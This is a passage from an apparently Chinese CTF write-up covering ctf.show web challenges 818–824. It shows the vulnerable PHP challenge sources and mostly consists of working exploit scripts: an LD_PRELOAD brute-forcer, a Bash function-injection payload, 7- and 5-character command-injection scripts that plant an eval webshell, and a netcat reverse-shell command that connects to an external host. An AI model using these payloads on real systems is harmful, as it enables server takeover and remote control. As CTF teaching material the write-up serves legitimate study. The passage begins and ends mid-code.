class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s.send(x)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruter</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web819（利用bash的匿名函数环境变量）"><a href="#web819（利用bash的匿名函数环境变量）" class="headerlink" title="web819（利用bash的匿名函数环境变量）"></a>web819（利用bash的匿名函数环境变量）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-04-28 16:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-04-29 19:51:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    putenv(<span class="variable">$env</span>);</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到题目发现与818题目差不多，一个时pwn形式，一个http形式<br>当利用http形式时我们无法利用nginx的body缓存机制，原因时没办法让他听起来</p><p>于是这里就可以利用bash的匿名函数环境变量</p><p>为了修复破壳漏洞<br>官方规定<br><img src="https://img-blog.csdnimg.cn/c0f1d8e9d23942c69010988bedf48bcc.png"><br>同时我们了解到</p><blockquote><p>system()会调用fork()产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令<br>system()会继承环境变量，通过环境变量可能会造成系统安全的问题<br>于是我们可以构造环境变量构造whoami函数，利用system来进行移花接木</p></blockquote><p>这样利用要有前提，即sh -c所代表的要为bash命令<br><img src="https://img-blog.csdnimg.cn/ae7eee28feab4d3ba98d17cdfc12e8e8.png"><br>于是构造命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?env=BASH_FUNC_whoami%%=() &#123; nl /flag;&#125;</span><br></pre></td></tr></table></figure><p>总结：<br><img src="https://img-blog.csdnimg.cn/5c853353fb2c44cf9f48d7c272b101b8.png"></p><h1 id="web820（base64图片码）"><a href="#web820（base64图片码）" class="headerlink" title="web820（base64图片码）"></a>web820（base64图片码）</h1><p>base64的小介绍<br><img src="https://img-blog.csdnimg.cn/fef1381e13fd4eb08af848ae1cfc49c5.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-04-30 10:52:40</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-04-30 16:59:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ef</span> = getimagesize(<span class="variable">$tmpname</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$ef</span>!=<span class="literal">false</span>) &amp;&amp; (<span class="variable">$ef</span>[<span class="string">&#x27;mime&#x27;</span>]==<span class="string">&#x27;image/jpeg&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = base64_decode(file_get_contents(<span class="variable">$tmpname</span>));</span><br><span class="line">        file_put_contents(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file upload success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据源码我们发现他会获得一些图片信息并比对，之后对图片进行base64解码，并将解码后获得的内容放入shell.php中<br>利用百度师傅构造的图片成功getshell<br><img src="https://img-blog.csdnimg.cn/dbf55b16d6a3448d944d98b31b5dcb70.png"></p><h1 id="web821（7字符RCE）"><a href="#web821（7字符RCE）" class="headerlink" title="web821（7字符RCE）"></a>web821（7字符RCE）</h1><p><a href="https://blog.csdn.net/nzjdsds/article/details/102873187">7字符rce</a><br>原理如博客一样<br>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:01</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=[</span><br><span class="line"><span class="string">&quot;&gt;hp&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;1.p\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;d\\&gt;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;\\ -\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;e64\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;bas\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;7\\|\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;XSk\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;Fsx\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;dFV\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;kX0\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;bCg\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;XZh\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;AgZ\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;waH\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;PD9\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;o\\ \\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;ech\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;ls -t&gt;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;. 0&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span>(<span class="params">payload</span>):</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">writeFile(p.strip())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">response = requests.get(url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">run()</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>利用脚本可以插入木马文件<br>这里需要用get进行蚁剑连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a5efc927-2331-4a26-9c31-248e9b58a782.challenge.ctf.show/1.php?1=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br></pre></td></tr></table></figure><p>进行套娃连接蚁剑<br>之后利用蚁剑连接数据库<br><img src="https://img-blog.csdnimg.cn/9d9abc861a714d85bbc4a82a92581d7f.png"><br>之后添加数据库mysqli，账号密码位root<br>之后得到flag</p><h1 id="web822（7字符不可写）"><a href="#web822（7字符不可写）" class="headerlink" title="web822（7字符不可写）"></a>web822（7字符不可写）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in database;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>) &lt;= <span class="number">7</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题目在web目录不可写<br>于是需要另一种方法<br>写到临时目录并执行它<br>(.表示执行一个sh脚本，使本身没有执行权限的脚本通过点可以执行，如果没要会报错)<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9fabb83a-ac44-40d5-a91f-06d5f3339269.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">b&quot;nc vps port -e /bin/sh&quot;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;. /t*/*&#x27;</span>&#125;</span><br><span class="line">test = requests.post(url=url,data=data,files=file)</span><br></pre></td></tr></table></figure><h1 id="web823（5字符可写，有dir）"><a href="#web823（5字符可写，有dir）" class="headerlink" title="web823（5字符可写，有dir）"></a>web823（5字符可写，有dir）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in database;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>) &lt;= <span class="number">5</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>*可以将文件名作为命令进行执行<br><img src="https://img-blog.csdnimg.cn/625240093f2a42cb8a0ba332576948da.png"><br>最好将脚本中的5字符命令自己敲一下<br>如果压缩包里面有php命令可以直接php进行运行<br>利用脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:17</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://77e86d43-d65b-4635-8230-9214d4463ff2.challenge.ctf.show/&quot;</span></span><br><span class="line">url_2 = url+<span class="string">&quot;.php&quot;</span></span><br><span class="line">delay = <span class="number">0.3</span></span><br><span class="line"></span><br><span class="line">chagneFile_payload=[</span><br><span class="line"><span class="string">&#x27;&gt;cp&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;k&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm cp&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;pc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm k&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm pc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm *v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;php.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\#&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">clearFile_payload=[</span><br><span class="line"><span class="string">&#x27;rm d*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm j*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm p*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm r*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm v*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">shell_payload=[</span><br><span class="line"><span class="string">&#x27;&gt;tar&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vcf&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def changeFile():</span><br><span class="line"><span class="keyword">for</span> p in chagneFile_payload:</span><br><span class="line">sendPayload(url,p)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(delay)</span><br><span class="line"></span><br><span class="line">def clearFile():</span><br><span class="line"><span class="keyword">for</span> p in clearFile_payload:</span><br><span class="line">sendPayload(url_2,p)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(delay)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line"><span class="keyword">for</span> p in shell_payload:</span><br><span class="line">sendPayload(url_2,p)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(delay)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;* /t*&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url_2,data=data,files=file)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;php z&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url_2,data=data)</span><br><span class="line"></span><br><span class="line">def checkShell():</span><br><span class="line">response = requests.get(url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">def sendPayload(url,payload):</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">changeFile()</span><br><span class="line">clearFile()</span><br><span class="line">getshell()</span><br><span class="line">checkShell()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="web824（5字符可写，无dir）"><a href="#web824（5字符可写，无dir）" class="headerlink" title="web824（5字符可写，无dir）"></a>web824（5字符可写，无dir）</h1><p>题目同上<br>写入grep h<br>接着执行* &gt; j<br>实际执行的是grep h index.php<br>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>之后将他cp到index.php，即<br>将j中的内容添加到index.php后面并且写入到i中<br>cat * &gt;&gt; i*<br>最后将i的copy到index.php中。<br>不过适用的情况不多，需要最终调用的命令带h或者p。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 